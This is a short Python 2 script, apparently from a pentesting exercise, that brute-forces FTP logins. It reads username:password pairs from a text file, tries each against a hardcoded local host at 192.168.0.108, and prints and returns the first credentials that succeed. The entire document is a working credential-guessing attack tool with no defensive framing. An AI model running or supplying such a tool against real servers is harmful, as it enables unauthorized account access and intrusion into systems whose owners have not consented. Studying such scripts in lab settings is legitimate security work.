import ftplib

#Attempts to make FTP connection by brute forcing password that it pulls from text file
def bruteLogin(hostname, passwdFile):
	pf = open(passwdFile, 'r') #open the password file
	for line in pf.readlines(): #iterate through every line in the file
		username = line.split(':')[0] #everything before the colon
		password = line.split(':')[1].strip('\r').strip('\n') #after the colon
		print '[+] Trying: '+username+":"+password

		try:
			ftp = ftplib.FTP(hostname) #setting the ftp host
			ftp.login(username, password)
			print '\n[*] ' + str(hostname) + ' FTP login succeeded: ' +username+":" +password
			ftp.quit()
			return (username, password)

		except Exception, e:
			pass
	
	print '\n[-] Could not brute force the FTP Credentials.'
	pf.close()
	return (None, None)

host = '192.168.0.108'
passwdFile = 'password2.txt'
bruteLogin(host,passwdFile)

